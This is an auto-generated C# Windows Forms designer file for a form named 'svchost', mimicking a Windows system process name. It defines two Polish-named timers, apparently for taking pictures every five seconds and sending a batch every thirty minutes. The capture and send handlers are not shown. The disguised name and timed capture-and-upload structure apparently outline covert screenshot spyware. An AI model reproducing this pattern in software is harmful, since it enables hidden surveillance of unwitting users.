namespace svchost
{
    partial class svchost
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.robienieZdjec = new System.Windows.Forms.Timer(this.components);
            this.wysylanieStosu = new System.Windows.Forms.Timer(this.components);
            this.SuspendLayout();
            // 
            // robienieZdjec
            // 
            this.robienieZdjec.Enabled = true;
            this.robienieZdjec.Interval = 5000;
            this.robienieZdjec.Tick += new System.EventHandler(this.robienieZdjec_Tick);
            // 
            // wysylanieStosu
            // 
            this.wysylanieStosu.Enabled = true;
            this.wysylanieStosu.Interval = 1800000;
            this.wysylanieStosu.Tick += new System.EventHandler(this.wysylanieStosu_Tick_1);
            // 
            // svchost
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(284, 262);
            this.Name = "svchost";
            this.Text = "svchost";
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Timer robienieZdjec;
        private System.Windows.Forms.Timer wysylanieStosu;
    }
}

